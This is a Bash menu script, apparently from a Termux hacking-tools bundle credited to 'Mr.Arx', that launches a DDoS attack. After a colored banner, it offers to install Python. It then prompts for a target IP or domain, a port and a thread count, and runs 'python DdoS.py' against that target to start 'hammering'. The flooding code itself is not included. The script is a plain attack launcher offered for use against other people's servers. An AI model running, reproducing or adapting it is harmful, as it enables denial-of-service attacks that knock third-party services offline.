#contoh
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m'
cy='\033[36;1m'
me='\033[31;1m'
pu='\033[37;1m'
ku='\033[33;1m' 
mer='\033[41;97m'
R='\x1b[1;31m'
G='\x1b[1;32m'
B='\x1b[1;34m'
Y='\x1b[1;33m'
C='\x1b[1;36m'
D='\x1b[0m'
endc='\E[0m'
enda='\033[0m'

clear
echo "waiting......"
sleep 4
clear
echo
echo
echo $me":::::::::::::::::::::::::::::::::::::::::::::::"
echo "                                              :"
echo "            "Author : Mr.Arx"                   :"
echo "                                              :"
echo "     Xploit                                   :"
echo "                                              :"
echo "github:https://github.com/mr-arx              :"
echo $pu"                  Doominic                    :"
echo "github:https://github.com/ArxGaming           :"
echo "                                              :"
echo "    CyberTeam                                 :"
echo "                                              :"
echo ":::::::::::::::::::::::::::::::::::::::::::::::"
echo $cy"1.install tools
2.DdoS execution
3.exit
         
         
         if you want to using DdoS first u must install tools
         after you install tools u must CMD:python DdoS.py -s (paste IP target) -p 80 -t 135
         Disclaimer!!! Your IP is visible
         by Mr-arx

"$me
read -p "DoXploit:" no
echo
if [ $no = '1' ]
then
echo
clear
pkg install python
sleep 7
clear
echo"waiting....."
sleep 2
sh DdoS.sh
fi

if [ $no = '2' ]
then
read -p "IP Server/DNS LOOKUP:" xinen
read -p "The Port recomen(80):" xintext
read -p "the turbo uagent recomen(135):" xingex
echo "waiting..."
sleep 4
echo "checking IP ($xinen)"
sleep 4
echo "checking Port ($xintext)"
sleep 4
echo "checking Turbo Uagent ($xingex)"
sleep 4
echo "waiting..."
sleep 3
echo "try to starting hammering..."
sleep 5
python DdoS.py -s $xinen -p $xintext -t $xingex
fi

if [ $no = '3' ]
then
echo do you want to exit y/n?
read -p "select:" lmao
fi

if [ $lmao = 'y' ]
then
echo $bi"thanks for using this."
sleep 5
exit
fi

if [ $lmao = 'n' ]
then
clear
sleep 6
echo"waiting......"
sh contoh.sh
fi
